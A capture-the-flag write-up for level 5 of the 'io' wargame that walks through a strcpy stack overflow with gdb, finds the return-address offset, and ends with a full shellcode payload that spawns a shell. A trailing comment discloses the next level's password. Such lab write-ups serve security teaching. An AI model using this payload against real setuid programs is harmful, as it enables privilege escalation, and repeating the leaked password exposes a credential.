## Level 5:

```c
 1 #include <stdio.h>
 2 #include <string.h>
 3 
 4 int main(int argc, char **argv) {
 5 
 6     char buf[128];
 7 
 8     if(argc < 2) return 1;
 9 
10     strcpy(buf, argv[1]);
11 
12     printf("%s\n", buf);
13 
14     return 0;
15 }
```

With a buffer of set size and a strcpy this will be another overflow problem. 

With a little bit of testing we can see that we can overwrite **EIP**. What we would like to do is set it to point to our code. Firstly we need to create a shell code which we will insert into the buffer and set **EIP** to be the address of the first byte.

Also I set a break before the **strcpy** function to see the buffer before jump.

```console
(gdb) disass main
Dump of assembler code for function main:
   0x080483b4 <+0>:	push   %ebp
   0x080483b5 <+1>:	mov    %esp,%ebp
   0x080483b7 <+3>:	sub    $0xa8,%esp
   0x080483bd <+9>:	and    $0xfffffff0,%esp
   0x080483c0 <+12>:	mov    $0x0,%eax
   0x080483c5 <+17>:	sub    %eax,%esp
   0x080483c7 <+19>:	cmpl   $0x1,0x8(%ebp)
   0x080483cb <+23>:	jg     0x80483d9 <main+37>
   0x080483cd <+25>:	movl   $0x1,-0x8c(%ebp)
   0x080483d7 <+35>:	jmp    0x8048413 <main+95>
   0x080483d9 <+37>:	mov    0xc(%ebp),%eax
   0x080483dc <+40>:	add    $0x4,%eax
   0x080483df <+43>:	mov    (%eax),%eax
   0x080483e1 <+45>:	mov    %eax,0x4(%esp)
   0x080483e5 <+49>:	lea    -0x88(%ebp),%eax
   0x080483eb <+55>:	mov    %eax,(%esp)
   0x080483ee <+58>:	call   0x80482d4 <strcpy@plt>
   0x080483f3 <+63>:	lea    -0x88(%ebp),%eax
   0x080483f9 <+69>:	mov    %eax,0x4(%esp)
   0x080483fd <+73>:	movl   $0x8048524,(%esp)
   0x08048404 <+80>:	call   0x80482b4 <printf@plt>
   0x08048409 <+85>:	movl   $0x0,-0x8c(%ebp)
   0x08048413 <+95>:	mov    -0x8c(%ebp),%eax
   0x08048419 <+101>:	leave  
   0x0804841a <+102>:	ret    
End of assembler dump.
(gdb) b *0x080483ee
Breakpoint 1 at 0x80483ee
(gdb) x/4wx $ebp
0xbffffbc8:	0x00000000	0xb7e26286	0x00000002	0xbffffc64
(gdb) x/s *0xbffffc64
0xbffffd8d:	"/levels/level05"
(gdb) x/s *0xbffffc68
0xbffffd9d:	'A' <repeats 144 times>
(gdb) print/x 0xbffffd9d + 0x73
$1 = 0xbffffe10
```

We can see the pointer to the argv[1] is **0xbffffd9d**, now with a bit of trying it is easy to find that **EIP** is from 140-144 bytes from this poitner. 

```console
(gdb) r $(python -c 'print "A"*140+"BBBB"')
Starting program: /levels/level05 $(python -c 'print "A"*140+"BBBB"')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

So we need to generate the payload to be 144 bytes long, include the shell code and the last 4 bytes must point to the start of the shell code.

Example shell code:
```c
char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
```
Reference: http://shell-storm.org/shellcode/files/shellcode-827.html

This shell code is 23 bytes long so we need to point to 0xbffffe12 (0xbffffd9d + 0x75(117 (140-23)))

Further reading: [shell coding by Steve Hanna](https://www.vividmachines.com/shellcode/shellcode.html) goes into details of making shell codes rather then using tools such as metasploit to generate the payload.

After all this we can finally generate the final payload and execute it:

```console
level5@io:/levels$ ./level05 $(python -c 'print "A"*117+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x12\xfe\xff\xbf"')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1�Ph//shh/bin��PS��
                               ���
sh-4.3$ 
```

<!-- Level 6 password ==> fQ8W8YlSBJBWKV2R -->